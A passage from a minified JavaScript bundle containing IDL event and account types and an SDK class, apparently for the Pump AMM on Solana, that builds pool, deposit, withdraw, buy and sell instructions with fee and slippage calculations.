            { name: "timestamp", type: "i64" },
            { name: "lp_token_amount_out", type: "u64" },
            { name: "max_base_amount_in", type: "u64" },
            { name: "max_quote_amount_in", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "base_amount_in", type: "u64" },
            { name: "quote_amount_in", type: "u64" },
            { name: "lp_mint_supply", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "user_pool_token_account", type: "pubkey" },
          ],
        },
      },
      {
        name: "DisableEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "disable_create_pool", type: "bool" },
            { name: "disable_deposit", type: "bool" },
            { name: "disable_withdraw", type: "bool" },
            { name: "disable_buy", type: "bool" },
            { name: "disable_sell", type: "bool" },
          ],
        },
      },
      {
        name: "ExtendAccountEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "account", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "current_size", type: "u64" },
            { name: "new_size", type: "u64" },
          ],
        },
      },
      {
        name: "GlobalConfig",
        type: {
          kind: "struct",
          fields: [
            { name: "admin", docs: ["The admin pubkey"], type: "pubkey" },
            {
              name: "lp_fee_basis_points",
              docs: ["The lp fee in basis points (0.01%)"],
              type: "u64",
            },
            {
              name: "protocol_fee_basis_points",
              docs: ["The protocol fee in basis points (0.01%)"],
              type: "u64",
            },
            {
              name: "disable_flags",
              docs: [
                "Flags to disable certain functionality",
                "bit 0 - Disable create pool",
                "bit 1 - Disable deposit",
                "bit 2 - Disable withdraw",
                "bit 3 - Disable buy",
                "bit 4 - Disable sell",
              ],
              type: "u8",
            },
            {
              name: "protocol_fee_recipients",
              docs: ["Addresses of the protocol fee recipients"],
              type: { array: ["pubkey", 8] },
            },
            {
              name: "coin_creator_fee_basis_points",
              docs: ["The coin creator fee in basis points (0.01%)"],
              type: "u64",
            },
          ],
        },
      },
      {
        name: "Pool",
        type: {
          kind: "struct",
          fields: [
            { name: "pool_bump", type: "u8" },
            { name: "index", type: "u16" },
            { name: "creator", type: "pubkey" },
            { name: "base_mint", type: "pubkey" },
            { name: "quote_mint", type: "pubkey" },
            { name: "lp_mint", type: "pubkey" },
            { name: "pool_base_token_account", type: "pubkey" },
            { name: "pool_quote_token_account", type: "pubkey" },
            {
              name: "lp_supply",
              docs: ["True circulating supply without burns and lock-ups"],
              type: "u64",
            },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SellEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_amount_in", type: "u64" },
            { name: "min_quote_amount_out", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "quote_amount_out", type: "u64" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "lp_fee", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee", type: "u64" },
            { name: "quote_amount_out_without_lp_fee", type: "u64" },
            { name: "user_quote_amount_out", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "protocol_fee_recipient", type: "pubkey" },
            { name: "protocol_fee_recipient_token_account", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
            { name: "coin_creator_fee_basis_points", type: "u64" },
            { name: "coin_creator_fee", type: "u64" },
          ],
        },
      },
      {
        name: "SetBondingCurveCoinCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_mint", type: "pubkey" },
            { name: "pool", type: "pubkey" },
            { name: "bonding_curve", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "SetMetaplexCoinCreatorEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "base_mint", type: "pubkey" },
            { name: "pool", type: "pubkey" },
            { name: "metadata", type: "pubkey" },
            { name: "coin_creator", type: "pubkey" },
          ],
        },
      },
      {
        name: "UpdateAdminEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "new_admin", type: "pubkey" },
          ],
        },
      },
      {
        name: "UpdateFeeConfigEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "admin", type: "pubkey" },
            { name: "lp_fee_basis_points", type: "u64" },
            { name: "protocol_fee_basis_points", type: "u64" },
            { name: "protocol_fee_recipients", type: { array: ["pubkey", 8] } },
            { name: "coin_creator_fee_basis_points", type: "u64" },
          ],
        },
      },
      {
        name: "WithdrawEvent",
        type: {
          kind: "struct",
          fields: [
            { name: "timestamp", type: "i64" },
            { name: "lp_token_amount_in", type: "u64" },
            { name: "min_base_amount_out", type: "u64" },
            { name: "min_quote_amount_out", type: "u64" },
            { name: "user_base_token_reserves", type: "u64" },
            { name: "user_quote_token_reserves", type: "u64" },
            { name: "pool_base_token_reserves", type: "u64" },
            { name: "pool_quote_token_reserves", type: "u64" },
            { name: "base_amount_out", type: "u64" },
            { name: "quote_amount_out", type: "u64" },
            { name: "lp_mint_supply", type: "u64" },
            { name: "pool", type: "pubkey" },
            { name: "user", type: "pubkey" },
            { name: "user_base_token_account", type: "pubkey" },
            { name: "user_quote_token_account", type: "pubkey" },
            { name: "user_pool_token_account", type: "pubkey" },
          ],
        },
      },
    ],
  };
  function eg(t, e) {
    if (e.isZero()) throw new Error("Cannot divide by zero.");
    return t.add(e.subn(1)).div(e);
  }
  function ng(t, e) {
    return eg(t.mul(e), new Yn(1e4));
  }
  function rg(t, e = Zm) {
    const n = { ...tg };
    return (n.address = e), new Vm(n, new Zf(t, null, {}));
  }
  var og = new Yn(1e4);
  function ig(t, e, n, r, o, i) {
    if (n.isZero() || r.isZero())
      throw new Error(
        "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
      );
    if (t.gt(r))
      throw new Error(
        "Cannot receive more quote tokens than the pool quote reserves."
      );
    const s = (function (t, e, n, r) {
      const o = e.add(n).add(r),
        i = og.sub(o);
      return eg(t.mul(og), i);
    })(
      t,
      o.lpFeeBasisPoints,
      o.protocolFeeBasisPoints,
      Ji.default.equals(i) ? new Yn(0) : o.coinCreatorFeeBasisPoints
    );
    if (s.gte(r))
      throw new Error(
        "Invalid input: Desired quote amount exceeds available reserve."
      );
    const a = eg(n.mul(s), r.sub(s)),
      u = new Yn(1e9),
      c = 1e9 * (1 - e / 100),
      l = new Yn(Math.floor(c));
    return { internalRawQuote: s, base: a, minQuote: t.mul(l).div(u) };
  }
  var sg = class {
      constructor(t, e = Zm) {
        (this.connection = t),
          (this.program = rg(t, e)),
          (this.offlineProgram = rg(null, e)),
          (this.globalConfig = (function (t = Xm) {
            return Ji.findProgramAddressSync([dt.from("global_config")], t);
          })(this.offlineProgram.programId)[0]);
      }
      programId() {
        return this.offlineProgram.programId;
      }
      globalConfigKey() {
        return this.globalConfig;
      }
      poolKey(t, e, n, r) {
        return Jm(t, e, n, r, this.offlineProgram.programId);
      }
      lpMintKey(t) {
        return (function (t, e = Xm) {
          return Ji.findProgramAddressSync(
            [dt.from("pool_lp_mint"), t.toBuffer()],
            e
          );
        })(t, this.offlineProgram.programId);
      }
      fetchGlobalConfigAccount() {
        return this.program.account.globalConfig.fetch(this.globalConfig);
      }
      fetchPool(t) {
        return this.program.account.pool.fetch(t);
      }
      decodeGlobalConfig(t) {
        return this.offlineProgram.coder.accounts.decode(
          "globalConfig",
          t.data
        );
      }
      decodePool(t) {
        return this.offlineProgram.coder.accounts.decode("pool", t.data);
      }
      async createPoolInstructionsInternal(t, e, n) {
        const {
          index: r,
          creator: o,
          baseMint: i,
          quoteMint: s,
          poolKey: a,
          baseTokenProgram: u,
          quoteTokenProgram: c,
          userBaseTokenAccount: l,
          userQuoteTokenAccount: d,
          poolBaseTokenAccount: f,
          poolQuoteTokenAccount: h,
          userBaseAccountInfo: p,
          userQuoteAccountInfo: m,
          poolBaseAccountInfo: g,
          poolQuoteAccountInfo: y,
        } = t;
        return await this.withWsolAccounts(
          o,
          i,
          l,
          this.accountExists(p, u),
          e,
          s,
          d,
          this.accountExists(m, c),
          n,
          async () => {
            const t = [];
            return (
              this.accountExists(g, u) || t.push(Al(o, f, a, i, u)),
              this.accountExists(y, c) || t.push(Al(o, h, a, s, c)),
              t.push(
                await this.offlineProgram.methods
                  .createPool(r, e, n, Gs.programId)
                  .accountsPartial({
                    globalConfig: this.globalConfig,
                    baseMint: i,
                    quoteMint: s,
                    creator: o,
                    userBaseTokenAccount: l,
                    userQuoteTokenAccount: d,
                    baseTokenProgram: u,
                    quoteTokenProgram: c,
                  })
                  .instruction()
              ),
              t
            );
          }
        );
      }
      async depositInstructionsInternal(t, e, n, r) {
        const {
            pool: o,
            user: i,
            userPoolAccountInfo: s,
            userBaseTokenAccount: a,
            userQuoteTokenAccount: u,
            userPoolTokenAccount: c,
            userBaseAccountInfo: l,
            userQuoteAccountInfo: d,
            baseTokenProgram: f,
            quoteTokenProgram: h,
          } = t,
          { baseMint: p, quoteMint: m, lpMint: g } = o,
          y = this.liquidityAccounts(t);
        return await this.withFixPoolInstructions(
          t,
          async () =>
            await this.withWsolAccounts(
              i,
              p,
              a,
              this.accountExists(l, f),
              n,
              m,
              u,
              this.accountExists(d, h),
              r,
              async () => {
                const t = [];
                return (
                  this.accountExists(s, Cc) || t.push(Al(i, c, i, g, Cc)),
                  t.push(
                    await this.offlineProgram.methods
                      .deposit(e, n, r)
                      .accounts(y)
                      .instruction()
                  ),
                  t
                );
              }
            )
        );
      }
      async withWsolAccounts(t, e, n, r, o, i, s, a, u, c) {
        return await this.withWsolAccount(t, t, e, n, r, o, async () =>
          this.withWsolAccount(t, t, i, s, a, u, c)
        );
      }
      async withWsolAccount(t, e, n, r, o, i, s, a = !0) {
        const u = [];
        n.equals(xc) &&
          (o || u.push(Al(t, r, e, xc)),
          i.gtn(0) &&
            u.push(
              Gs.transfer({
                fromPubkey: e,
                toPubkey: r,
                lamports: BigInt(i.toString()),
              }),
              (function (t, e = Bc) {
                const n = [{ pubkey: t, isSigner: !1, isWritable: !0 }],
                  r = dt.alloc(Il.span);
                return (
                  Il.encode({ instruction: Vc.SyncNative }, r),
                  new vs({ keys: n, programId: e, data: r })
                );
              })(r)
            ));
        const c = await s();
        return (
          u.push(...c), n.equals(xc) && a && u.push(yl(r, e, e, void 0, Bc)), u
        );
      }
      accountExists(t, e) {
        return null !== t && t.owner.equals(e);
      }
      depositBaseInputInternal(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          {
            token1: s,
            lpToken: a,
            maxToken0: u,
            maxToken1: c,
          } = Qm(
            e,
            n,
            new Yn(o.amount.toString()),
            new Yn(i.amount.toString()),
            r.lpSupply
          );
        return { quote: s, lpToken: a, maxBase: u, maxQuote: c };
      }
      depositQuoteInputInternal(t, e, n) {
        const {
            pool: r,
            poolBaseTokenAccount: o,
            poolQuoteTokenAccount: i,
          } = t,
          {
            token1: s,
            lpToken: a,
            maxToken0: u,
            maxToken1: c,
          } = Qm(
            e,
            n,
            new Yn(i.amount.toString()),
            new Yn(o.amount.toString()),
            r.lpSupply
          );
        return { base: s, lpToken: a, maxBase: c, maxQuote: u };
      }
      async withdrawInstructionsInternal(t, e, n, r) {
        const {
            pool: o,
            baseTokenProgram: i,
            quoteTokenProgram: s,
            user: a,
            userBaseAccountInfo: u,
            userQuoteAccountInfo: c,
            userBaseTokenAccount: l,
            userQuoteTokenAccount: d,
          } = t,
          { baseMint: f, quoteMint: h } = o,
          p = this.liquidityAccounts(t);
        return await this.withFixPoolInstructions(t, async () => {
          const t = [];
          let o = !1;
          this.accountExists(u, i) ||
            (t.push(Al(a, l, a, f, i)), f.equals(xc) && (o = !0));
          let m = !1;
          return (
            this.accountExists(c, s) ||
              (t.push(Al(a, d, a, h, s)), h.equals(xc) && (m = !0)),
            t.push(
              await this.offlineProgram.methods
                .withdraw(e, n, r)
                .accounts(p)
                .instruction()
            ),
            o && t.push(yl(l, a, a, void 0, Bc)),
            m && t.push(yl(d, a, a, void 0, Bc)),
            t
          );
        });
      }
      withdrawInputsInternal(t, e, n) {
        const {
          pool: r,
          poolBaseTokenAccount: o,
          poolQuoteTokenAccount: i,
        } = t;
        return (function (t, e, n, r, o) {
          if (t.isZero() || o.isZero())
            throw new Error("LP amount or total LP tokens cannot be zero.");
          const i = n.mul(t).div(o),
            s = r.mul(t).div(o),
            a = new Yn(1e9),
            u = new Yn(1e9 * (1 - e / 100)),
            c = i.mul(u).div(a),
            l = s.mul(u).div(a);
          return { base: i, quote: s, minBase: c, minQuote: l };
        })(
          e,
          n,
          new Yn(o.amount.toString()),
          new Yn(i.amount.toString()),
          r.lpSupply
        );
      }
      liquidityAccounts(t) {
        const {
            poolKey: e,
            pool: n,
            user: r,
            userBaseTokenAccount: o,
            userQuoteTokenAccount: i,
            userPoolTokenAccount: s,
          } = t,
          {
            baseMint: a,
            quoteMint: u,
            lpMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = n;
        let f = this.programId(),
          [h] = Ym(f);
        return {
          pool: e,
          globalConfig: this.globalConfig,
          user: r,
          baseMint: a,
          quoteMint: u,
          lpMint: c,
          userBaseTokenAccount: o,
          userQuoteTokenAccount: i,
          userPoolTokenAccount: s,
          poolBaseTokenAccount: l,
          poolQuoteTokenAccount: d,
          tokenProgram: Bc,
          token2022Program: Cc,
          eventAuthority: h,
          program: f,
        };
      }
      async buyInstructionsInternal(t, e, n) {
        return await this.withFixPoolInstructions(
          t,
          async () => await this.buyInstructionsInternalNoPool(t, e, n)
        );
      }
      async createPoolSolanaState(t, e, n, r, o = void 0, i = void 0) {
        const [s, a, u] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          n,
          r,
        ]);
        if (null === s) throw new Error("Global config account not found");
        if (null === a) throw new Error(`baseMint=${n.toString()} not found`);
        if (null === u) throw new Error(`quoteMint=${r.toString()} not found`);
        const c = this.decodeGlobalConfig(s),
          [l, d] = [a.owner, u.owner],
          [f] = Jm(t, e, n, r, this.offlineProgram.programId),
          h = ml(n, f, !0, l),
          p = ml(r, f, !0, d),
          [m, g] = await this.connection.getMultipleAccountsInfo([h, p]);
        void 0 === o && (o = ml(n, e, !0, l)),
          void 0 === i && (i = ml(r, e, !0, d));
        const [y, w] = await this.connection.getMultipleAccountsInfo([o, i]);
        return {
          index: t,
          creator: e,
          baseMint: n,
          quoteMint: r,
          globalConfig: c,
          poolKey: f,
          poolBaseTokenAccount: h,
          poolQuoteTokenAccount: p,
          baseTokenProgram: l,
          quoteTokenProgram: d,
          userBaseTokenAccount: o,
          userQuoteTokenAccount: i,
          userBaseAccountInfo: y,
          userQuoteAccountInfo: w,
          poolBaseAccountInfo: m,
          poolQuoteAccountInfo: g,
        };
      }
      async swapSolanaState(t, e, n = void 0, r = void 0) {
        const [o, i] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === o) throw new Error("Global config account not found");
        if (null === i) throw new Error("Pool account not found");
        const s = this.decodeGlobalConfig(o),
          a = this.decodePool(i),
          {
            baseMint: u,
            quoteMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = a,
          [f, h, p, m] = await this.connection.getMultipleAccountsInfo([
            u,
            c,
            l,
            d,
          ]);
        if (null === f) throw new Error(`baseMint=${u.toString()} not found`);
        if (null === h) throw new Error(`quoteMint=${c.toString()} not found`);
        if (null === p)
          throw new Error(`Pool base token account ${l.toString()} not found`);
        if (null === m)
          throw new Error(`Pool quote token account ${d.toString()} not found`);
        const [g, y] = [f.owner, h.owner],
          w = $c.decode(p.data),
          b = $c.decode(m.data);
        void 0 === n && (n = ml(u, e, !0, g)),
          void 0 === r && (r = ml(c, e, !0, y));
        const [v, A] = await this.connection.getMultipleAccountsInfo([n, r]);
        return {
          globalConfig: s,
          poolKey: t,
          poolAccountInfo: i,
          pool: a,
          poolBaseAmount: new Yn(w.amount.toString()),
          poolQuoteAmount: new Yn(b.amount.toString()),
          baseTokenProgram: g,
          quoteTokenProgram: y,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userBaseAccountInfo: v,
          userQuoteAccountInfo: A,
        };
      }
      async swapSolanaStateNoPool(t, e, n = void 0, r = void 0) {
        const [o, i] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === o) throw new Error("Global config account not found");
        if (null === i) throw new Error("Pool account not found");
        const s = this.decodeGlobalConfig(o),
          a = this.decodePool(i),
          {
            baseMint: u,
            quoteMint: c,
            poolBaseTokenAccount: l,
            poolQuoteTokenAccount: d,
          } = a,
          [f, h, p, m] = await this.connection.getMultipleAccountsInfo([
            u,
            c,
            l,
            d,
          ]);
        if (null === f) throw new Error(`baseMint=${u.toString()} not found`);
        if (null === h) throw new Error(`quoteMint=${c.toString()} not found`);
        if (null === p)
          throw new Error(`Pool base token account ${l.toString()} not found`);
        if (null === m)
          throw new Error(`Pool quote token account ${d.toString()} not found`);
        const [g, y] = [f.owner, h.owner],
          w = $c.decode(p.data),
          b = $c.decode(m.data);
        void 0 === n && (n = ml(u, e, !0, g)),
          void 0 === r && (r = ml(c, e, !0, y));
        const [v, A] = await this.connection.getMultipleAccountsInfo([n, r]);
        return {
          globalConfig: s,
          poolKey: t,
          poolAccountInfo: i,
          pool: a,
          poolBaseAmount: new Yn(w.amount.toString()),
          poolQuoteAmount: new Yn(b.amount.toString()),
          baseTokenProgram: g,
          quoteTokenProgram: y,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userBaseAccountInfo: v,
          userQuoteAccountInfo: A,
        };
      }
      async liquiditySolanaState(t, e, n = void 0, r = void 0, o = void 0) {
        const [i, s] = await this.connection.getMultipleAccountsInfo([
          this.globalConfig,
          t,
        ]);
        if (null === i) throw new Error("Global config account not found");
        if (null === s) throw new Error("Pool account not found");
        const a = this.decodeGlobalConfig(i),
          u = this.decodePool(s),
          {
            baseMint: c,
            quoteMint: l,
            lpMint: d,
            poolBaseTokenAccount: f,
            poolQuoteTokenAccount: h,
          } = u,
          [p, m, g, y] = await this.connection.getMultipleAccountsInfo([
            c,
            l,
            f,
            h,
          ]);
        if (null === p) throw new Error(`baseMint=${c.toString()} not found`);
        if (null === m) throw new Error(`quoteMint=${l.toString()} not found`);
        if (null === g)
          throw new Error(`Pool base token account ${f.toString()} not found`);
        if (null === y)
          throw new Error(`Pool quote token account ${h.toString()} not found`);
        const [w, b] = [p.owner, m.owner],
          v = $c.decode(g.data),
          A = $c.decode(y.data);
        void 0 === n && (n = ml(c, e, !0, w)),
          void 0 === r && (r = ml(l, e, !0, b)),
          void 0 === o && (o = ml(d, e, !0, Cc));
        const [k, I, S] = await this.connection.getMultipleAccountsInfo([
          n,
          r,
          o,
        ]);
        return {
          globalConfig: a,
          poolKey: t,
          poolAccountInfo: s,
          pool: u,
          poolBaseTokenAccount: v,
          poolQuoteTokenAccount: A,
          baseTokenProgram: w,
          quoteTokenProgram: b,
          user: e,
          userBaseTokenAccount: n,
          userQuoteTokenAccount: r,
          userPoolTokenAccount: o,
          userBaseAccountInfo: k,
          userQuoteAccountInfo: I,
          userPoolAccountInfo: S,
        };
      }
      async buyInstructionsInternalNoPool(t, e, n) {
        const { userBaseAccountInfo: r, userQuoteAccountInfo: o } = t,
          i = this.swapAccounts(t),
          {
            user: s,
            baseMint: a,
            quoteMint: u,
            userBaseTokenAccount: c,
            userQuoteTokenAccount: l,
            baseTokenProgram: d,
            quoteTokenProgram: f,
          } = i;
        return this.withWsolAccount(
          s,
          s,
          u,
          l,
          this.accountExists(o, f),
          n,
          async () => {
            const t = [];
            return (
              this.accountExists(r, d) || t.push(Al(s, c, s, a, d)),
              t.push(
                await this.offlineProgram.methods
                  .buy(e, n)
                  .accounts(i)
                  .instruction()
              ),
              a.equals(xc) && t.push(yl(c, s, s, void 0, Bc)),
              t
            );
          }
        );
      }
      async buyBaseInput(t, e, n) {
        const { maxQuote: r } = this.buyBaseInputInternal(t, e, n);
        return this.buyInstructionsInternal(t, e, r);
      }
      async buyQuoteInput(t, e, n) {
        const { base: r, maxQuote: o } = this.buyQuoteInputInternal(t, e, n);
        return this.buyInstructionsInternal(t, r, o);
      }
      buyAutocompleteQuoteFromBase(t, e, n) {
        const { uiQuote: r } = this.buyBaseInputInternal(t, e, n);
        return r;
      }
      buyAutocompleteBaseFromQuote(t, e, n) {
        const { base: r } = this.buyQuoteInputInternal(t, e, n);
        return r;
      }
      buyBaseInputInternal(t, e, n) {
        const {
          pool: r,
          globalConfig: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          if (t.gt(n))
            throw new Error(
              "Cannot buy more base tokens than the pool reserves."
            );
          const s = r.mul(t),
            a = n.sub(t);
          if (a.isZero())
            throw new Error("Pool would be depleted; denominator is zero.");
          const u = eg(s, a),
            c = ng(u, o.lpFeeBasisPoints),
            l = ng(u, o.protocolFeeBasisPoints),
            d = Ji.default.equals(i)
              ? new Yn(0)
              : ng(u, o.coinCreatorFeeBasisPoints),
            f = u.add(c).add(l).add(d),
            h = new Yn(1e9),
            p = 1e9 * (1 + e / 100),
            m = new Yn(Math.floor(p)),
            g = f.mul(m).div(h);
          return { internalQuoteAmount: u, uiQuote: f, maxQuote: g };
        })(e, n, i, s, o, r.coinCreator);
      }
      buyQuoteInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          const s = o.lpFeeBasisPoints
              .add(o.protocolFeeBasisPoints)
              .add(
                Ji.default.equals(i) ? new Yn(0) : o.coinCreatorFeeBasisPoints
              ),
            a = new Yn(1e4).add(s),
            u = t.mul(new Yn(1e4)).div(a),
            c = n.mul(u),
            l = r.add(u);
          if (l.isZero())
            throw new Error("Pool would be depleted; denominator is zero.");
          const d = c.div(l),
            f = new Yn(1e9),
            h = 1e9 * (1 + e / 100),
            p = new Yn(Math.floor(h));
          return {
            base: d,
            internalQuoteWithoutFees: u,
            maxQuote: t.mul(p).div(f),
          };
        })(e, n, i, s, r, o.coinCreator);
      }
      async sellInstructionsInternal(t, e, n) {
        return await this.withFixPoolInstructions(
          t,
          async () => await this.sellInstructionsInternalNoPool(t, e, n)
        );
      }
      async withFixPoolInstructions(t, e) {
        const { poolAccountInfo: n, poolKey: r, user: o } = t,
          i = [];
        return (
          (null === n || n.data.length < 300) &&
            i.push(
              await this.offlineProgram.methods
                .extendAccount()
                .accountsPartial({ account: r, user: o })
                .instruction()
            ),
          [...i, ...(await e())]
        );
      }
      async sellInstructionsInternalNoPool(t, e, n) {
        const { userBaseAccountInfo: r, userQuoteAccountInfo: o } = t,
          i = this.swapAccounts(t),
          {
            user: s,
            baseMint: a,
            quoteMint: u,
            userBaseTokenAccount: c,
            userQuoteTokenAccount: l,
            baseTokenProgram: d,
            quoteTokenProgram: f,
          } = i;
        return this.withWsolAccount(
          s,
          s,
          a,
          c,
          this.accountExists(r, d),
          e,
          async () => {
            const t = [];
            return (
              this.accountExists(o, f) || t.push(Al(s, l, s, u, f)),
              t.push(
                await this.offlineProgram.methods
                  .sell(e, n)
                  .accounts(i)
                  .instruction()
              ),
              u.equals(xc) && t.push(yl(l, s, s, void 0, Bc)),
              t
            );
          }
        );
      }
      async sellBaseInput(t, e, n) {
        const { minQuote: r } = this.sellBaseInputInternal(t, e, n);
        return this.sellInstructionsInternal(t, e, r);
      }
      async sellQuoteInput(t, e, n) {
        const { base: r, minQuote: o } = this.sellQuoteInputInternal(t, e, n);
        return this.sellInstructionsInternal(t, r, o);
      }
      sellAutocompleteQuoteFromBase(t, e, n) {
        const { uiQuote: r } = this.sellBaseInputInternal(t, e, n);
        return r;
      }
      sellAutocompleteBaseFromQuote(t, e, n) {
        const { base: r } = this.sellQuoteInputInternal(t, e, n);
        return r;
      }
      sellBaseInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return (function (t, e, n, r, o, i) {
          if (n.isZero() || r.isZero())
            throw new Error(
              "Invalid input: 'baseReserve' or 'quoteReserve' cannot be zero."
            );
          const s = r.mul(t).div(n.add(t)),
            a = ng(s, o.lpFeeBasisPoints),
            u = ng(s, o.protocolFeeBasisPoints),
            c = Ji.default.equals(i)
              ? new Yn(0)
              : ng(s, o.coinCreatorFeeBasisPoints),
            l = s.sub(a).sub(u).sub(c);
          if (l.isNeg())
            throw new Error(
              "Fees exceed total output; final quote is negative."
            );
          const d = new Yn(1e9),
            f = 1e9 * (1 - e / 100),
            h = new Yn(Math.floor(f)),
            p = l.mul(h).div(d);
          return { uiQuote: l, minQuote: p, internalQuoteAmountOut: s };
        })(e, n, i, s, r, o.coinCreator);
      }
      sellQuoteInputInternal(t, e, n) {
        const {
          globalConfig: r,
          pool: o,
          poolBaseAmount: i,
          poolQuoteAmount: s,
        } = t;
        return ig(e, n, i, s, r, o.coinCreator);
      }
      async extendAccount(t, e) {
        return this.offlineProgram.methods
          .extendAccount()
          .accountsPartial({ account: t, user: e })
          .instruction();
      }
      async collectCoinCreatorFeeSolanaState(t, e = void 0) {
        const n = xc,
          r = Bc;
        let o = this.coinCreatorVaultAuthorityPda(t),
          i = this.coinCreatorVaultAta(o, n, r);
        void 0 === e && (e = ml(n, t, !0, r));
        const [s, a] = await this.connection.getMultipleAccountsInfo([i, e]);
        return {
          coinCreator: t,
          quoteMint: n,
          quoteTokenProgram: r,
          coinCreatorVaultAuthority: o,
          coinCreatorVaultAta: i,
          coinCreatorTokenAccount: e,
          coinCreatorVaultAtaAccountInfo: s,
          coinCreatorTokenAccountInfo: a,
        };
      }
      async collectCoinCreatorFee(t) {
        const {
          coinCreator: e,
          quoteMint: n,
          quoteTokenProgram: r,
          coinCreatorVaultAuthority: o,
          coinCreatorVaultAta: i,
          coinCreatorTokenAccount: s,
          coinCreatorVaultAtaAccountInfo: a,
          coinCreatorTokenAccountInfo: u,
        } = t;
        return await this.withWsolAccount(
          e,
          o,
          n,
          i,
          this.accountExists(a, r),
          new Yn(0),
          async () =>
            await this.withWsolAccount(
              e,
              e,
              n,
              s,
              this.accountExists(u, r),
              new Yn(0),
              async () => [
                await this.offlineProgram.methods
                  .collectCoinCreatorFee()
                  .accountsPartial({
                    coinCreator: e,
                    coinCreatorTokenAccount: s,
                    quoteMint: n,
                    quoteTokenProgram: r,
                  })
                  .instruction(),
              ]
            ),
          !1
        );
      }
      async getCoinCreatorVaultBalance(t) {
        const e = xc,
          n = Bc,
          r = this.coinCreatorVaultAuthorityPda(t),
          o = this.coinCreatorVaultAta(r, e, n);
        try {
          const t = await el(this.connection, o, void 0, n);
          return new Yn(t.amount.toString());
        } catch (i) {
          return void 0, new Yn(0);
        }
      }
      async setCoinCreator(t) {
        return this.offlineProgram.methods
          .setCoinCreator()
          .accountsPartial({ pool: t })
          .instruction();
      }
      swapAccounts(t) {
        const {
            globalConfig: e,
            poolKey: n,
            pool: r,
            baseTokenProgram: o,
            quoteTokenProgram: i,
            user: s,
            userBaseTokenAccount: a,
            userQuoteTokenAccount: u,
          } = t,
          { protocolFeeRecipients: c } = e,
          l = c[Math.floor(Math.random() * c.length)],
          {
            baseMint: d,
            quoteMint: f,
            poolBaseTokenAccount: h,
            poolQuoteTokenAccount: p,
            coinCreator: m,
          } = r,
          g = this.coinCreatorVaultAuthorityPda(m);
        let y = this.programId(),
          [w] = Ym(y);
        return {
          pool: n,
          globalConfig: this.globalConfig,
          user: s,
          baseMint: d,
          quoteMint: f,
          userBaseTokenAccount: a,
          userQuoteTokenAccount: u,
          poolBaseTokenAccount: h,
          poolQuoteTokenAccount: p,
          protocolFeeRecipient: l,
          protocolFeeRecipientTokenAccount: ml(f, l, !0, i),
          baseTokenProgram: o,
          quoteTokenProgram: i,
          systemProgram: Gs.programId,
          associatedTokenProgram: Ec,
          eventAuthority: w,
          program: y,
          coinCreatorVaultAta: this.coinCreatorVaultAta(g, f, i),
          coinCreatorVaultAuthority: g,
        };
      }
      coinCreatorVaultAuthorityPda(t) {
        const [e] = Ji.findProgramAddressSync(
          [dt.from("creator_vault"), t.toBuffer()],
          this.programId()
        );
        return e;
      }
      coinCreatorVaultAta(t, e, n) {
        return ml(e, t, !0, n);
      }
    },
    ag = class {
      constructor(t, e = Zm) {
        this.pumpAmmInternalSdk = new sg(t, e);
      }
      programId() {
        return this.pumpAmmInternalSdk.programId();
      }
      globalConfigKey() {
        return this.pumpAmmInternalSdk.globalConfigKey();
      }
      poolKey(t, e, n, r) {
        return this.pumpAmmInternalSdk.poolKey(t, e, n, r);
      }
      lpMintKey(t) {
        return this.pumpAmmInternalSdk.lpMintKey(t);
      }
      fetchGlobalConfigAccount() {
